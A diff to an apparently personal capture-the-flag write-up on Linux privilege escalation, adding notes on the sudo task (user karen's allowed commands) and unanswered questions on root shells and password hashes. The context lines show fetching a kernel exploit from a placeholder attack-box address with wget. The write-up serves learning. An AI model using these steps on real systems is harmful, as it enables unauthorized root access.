@@ -59,7 +59,7 @@ escalation script [^4] which we can download on our attacking machine with the c
 with `python3 -m http.server 8080` and download it on the target machine with
 `wget <ATTACK_BOX_IP_ADDRESS>:8080/ofs.c`.
 
-**What is the content of the flag1.txt file?**
+**What is the content of the `flag1.txt` file?**
 
 However, we must first create a temporary directory in `/tmp/` because we are not 
 allowed to write to a new file in our missing home directory or anywhere else. Having 
@@ -80,6 +80,18 @@ not able to view due to missing root privileges.
 
 Task 6 - Privilege Escalation: Sudo
 -----------------------------------------------------------------------------------------
+**How many programs can the user *karen* run on the target system with sudo rights?**
+
+By running the `sudo -l` command, we find out, that *karen* can run the `find`, `less`
+and `nano` commands.
+
+**What is the content of the `flag2.txt` file?**
+
+
+**How would you use Nmap to spawn a root shell if your user had sudo rights on nmap?**
+
+**What is the hash of *frank's* password?**
+
 
 Task 7 - Privilege Escalation: SUID
 -----------------------------------------------------------------------------------------
